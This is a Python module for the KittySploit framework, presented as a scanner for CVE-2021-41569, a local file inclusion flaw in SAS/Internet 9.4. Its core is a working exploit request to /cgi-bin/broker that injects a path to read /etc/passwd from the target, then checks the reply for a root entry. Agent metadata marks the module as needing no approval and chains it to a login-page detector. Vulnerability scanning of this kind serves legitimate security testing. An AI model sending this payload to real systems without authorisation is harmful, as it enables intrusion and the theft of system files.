#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SAS/Internet 9."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SAS/Internet 9.4 1520 - Local File Inclusion Detection',
        'description': 'SAS/Internet 9.4 build 1520 and earlier allows local file inclusion. The samples library (included by default) in the appstart.sas file, allows end-users of the application to access the sample.webcsf1.sas program, which contains user-controlled macro variables that are passed to the DS2CSF macro.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'sas', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.mindpointgroup.com/blog/high-risk-vulnerability-discovery-localfileinclusion-sas',
            'https://support.sas.com/kb/68/641.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41569',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-41569',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/broker?csftyp=classic,+ssfile1%3d/etc/passwd&_SERVICE=targetservice&_DEBUG=131&_PROGRAM=sample.webcsf1.sas&sysparm=test&_ENTRY=SAMPLIB.WEBSAMP.PRINT_TO_HTML.SOURCE&BG=%23FFFFFF&DATASET=targetdataset&_DEBUG=131&TEMPFILE=Unknown&style=a+tcolor%3dblue&_WEBOUT=test&bgtype=COLOR', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="SAS/Internet 9.4 1520 - Local File Inclusion detected",
                path='/cgi-bin/broker?csftyp=classic,+ssfile1%3d/etc/passwd&_SERVICE=targetservice&_DEBUG=131&_PROGRAM=sample.webcsf1.sas&sysparm=test&_ENTRY=SAMPLIB.WEBSAMP.PRINT_TO_HTML.SOURCE&BG=%23FFFFFF&DATASET=targetdataset&_DEBUG=131&TEMPFILE=Unknown&style=a+tcolor%3dblue&_WEBOUT=test&bgtype=COLOR',
            )
            return True
        return False

